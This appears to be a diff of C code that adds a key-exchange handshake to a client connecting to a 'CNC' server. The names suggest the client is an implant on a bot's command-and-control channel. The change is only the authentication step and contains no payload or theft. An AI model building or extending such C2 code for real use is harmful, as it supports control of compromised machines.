@@ -48,6 +48,22 @@ void init_cnc_sock()
         fatal_error("Error at socket(): %ld", WSAGetLastError());
 }
 
+void auth_with_cnc()
+{
+    int ret;
+    char received_auth_key[AUTH_KEY_LEN + 1];
+
+    log_info("Authenticating with CNC.");
+    ret = send_to_cnc(AUTH_KEY_TO_CNC, AUTH_KEY_LEN);
+    if (ret != AUTH_KEY_LEN)
+        fatal_error("Failed to send authentication key to CNC.");
+
+    ret = recv_from_cnc(received_auth_key, AUTH_KEY_LEN);
+    received_auth_key[AUTH_KEY_LEN] = 0;
+    if (ret != AUTH_KEY_LEN || strcmp(received_auth_key, AUTH_KEY_FROM_CNC))
+        fatal_error("Received invalid authentication key from CNC.");
+}
+
 void connect_to_cnc(struct addrinfo *cnc_addrinfo)
 {
     int ret;
@@ -68,6 +84,7 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
         }
         else
         {
+            auth_with_cnc();
             log_info("Connected to CNC.");
             return;
         }
